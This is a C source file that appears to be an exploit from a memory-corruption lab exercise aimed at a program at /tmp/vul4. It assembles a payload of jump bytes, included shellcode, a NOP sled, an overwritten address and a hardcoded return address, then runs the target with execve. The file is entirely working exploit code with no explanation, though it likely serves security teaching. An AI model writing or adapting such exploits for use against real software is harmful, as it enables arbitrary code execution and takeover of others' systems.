#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul4"

int main(void)
{
	char payload[513];
	char l_addr[] = "\x68\xa0\x04\x08";
	char ret_addr[] = "\x60\xfc\xff\xbf";
	int i;

	i = 0;
	payload[i++] = '\xeb';
	payload[i++] = '\x06';
	payload[i++] = '\x90';
	payload[i++] = '\x90';
	payload[i++] = '\x01';
	payload[i++] = '\x90';
	payload[i++] = '\x90';
	payload[i++] = '\x90';
	for (i = i; i < 8 + strlen(shellcode); i++) {
		payload[i] = shellcode[i - 8];
	}
	for (i = i; i < 504; i++) {
		payload[i] = '\x90';
	}
	for (i = i; i < 504 + strlen(l_addr); i++) {
		payload[i] = l_addr[i - 504];
	}
	for (i = i; i < 508 + strlen(ret_addr); i++) {
		payload[i] = ret_addr[i - 508];
	}
	payload[i] = '\x90';

	char *args[] = { TARGET, payload, NULL };
	char *env[] = { NULL };

	execve(TARGET, args, env);
	fprintf(stderr, "execve failed.\n");

	return 0;
}
